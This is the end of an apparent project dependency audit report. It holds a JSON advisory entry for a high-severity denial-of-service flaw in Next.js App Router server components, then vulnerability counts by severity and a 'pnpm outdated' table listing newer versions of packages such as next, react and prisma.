      "overview": "A vulnerability affects certain React packages for versions 19.0.0, 19.0.1, 19.1.0, 19.1.1, 19.1.2, 19.2.0, and 19.2.1 and frameworks that use the affected packages, including Next.js 15.x and 16.x using the App Router. The issue is tracked upstream as [CVE-2025-55184](https://www.cve.org/CVERecord?id=CVE-2025-55184).\n\nA malicious HTTP request can be crafted and sent to any App Router endpoint that, when deserialized, can cause the server process to hang and consume CPU. This can result in denial of service in unpatched environments.",
      "reported_by": null,
      "title": "Next Vulnerable to Denial of Service with Server Components",
      "metadata": null,
      "cves": [],
      "access": "public",
      "severity": "high",
      "module_name": "next",
      "vulnerable_versions": ">=16.0.0-beta.0 <16.0.9",
      "github_advisory_id": "GHSA-mwv6-3258-q52c",
      "recommendation": "Upgrade to version 16.0.9 or later",
      "patched_versions": ">=16.0.9",
      "updated": "2025-12-11T22:49:30.000Z",
      "cvss": {
        "score": 7.5,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
      },
      "cwe": [
        "CWE-400",
        "CWE-502",
        "CWE-1395"
      ],
      "url": "https://github.com/advisories/GHSA-mwv6-3258-q52c"
    }
  },
  "muted": [],
  "metadata": {
    "vulnerabilities": {
      "info": 0,
      "low": 0,
      "moderate": 3,
      "high": 5,
      "critical": 1
    },
    "dependencies": 1256,
    "devDependencies": 0,
    "optionalDependencies": 0,
    "totalDependencies": 1256
  }
}
```

## pnpm outdated

- exit code: 1

```
pnpm outdated
```

### stdout

```
┌──────────────────────────┬─────────┬─────────┐
│ Package                  │ Current │ Latest  │
├──────────────────────────┼─────────┼─────────┤
│ @tanstack/react-virtual  │ 3.13.13 │ 3.13.14 │
├──────────────────────────┼─────────┼─────────┤
│ react                    │ 19.2.0  │ 19.2.3  │
├──────────────────────────┼─────────┼─────────┤
│ react-dom                │ 19.2.0  │ 19.2.3  │
├──────────────────────────┼─────────┼─────────┤
│ socket.io-client         │ 4.8.1   │ 4.8.3   │
├──────────────────────────┼─────────┼─────────┤
│ eslint-config-next (dev) │ 16.0.6  │ 16.1.1  │
├──────────────────────────┼─────────┼─────────┤
│ next                     │ 16.0.6  │ 16.1.1  │
├──────────────────────────┼─────────┼─────────┤
│ openai                   │ 6.10.0  │ 6.15.0  │
├──────────────────────────┼─────────┼─────────┤
│ react-day-picker         │ 9.12.0  │ 9.13.0  │
├──────────────────────────┼─────────┼─────────┤
│ react-grid-layout        │ 2.0.0   │ 2.2.2   │
├──────────────────────────┼─────────┼─────────┤
│ react-resizable          │ 3.0.5   │ 3.1.3   │
├──────────────────────────┼─────────┼─────────┤
│ typescript (dev)         │ 5.3.3   │ 5.9.3   │
├──────────────────────────┼─────────┼─────────┤
│ zod                      │ 4.1.13  │ 4.3.4   │
├──────────────────────────┼─────────┼─────────┤
│ @prisma/client           │ 5.22.0  │ 7.2.0   │
├──────────────────────────┼─────────┼─────────┤
│ @types/node (dev)        │ 20.10.6 │ 25.0.3  │
├──────────────────────────┼─────────┼─────────┤
│ prisma                   │ 5.22.0  │ 7.2.0   │
├──────────────────────────┼─────────┼─────────┤
│ lucide-react             │ 0.555.0 │ 0.562.0 │
└──────────────────────────┴─────────┴─────────┘
```

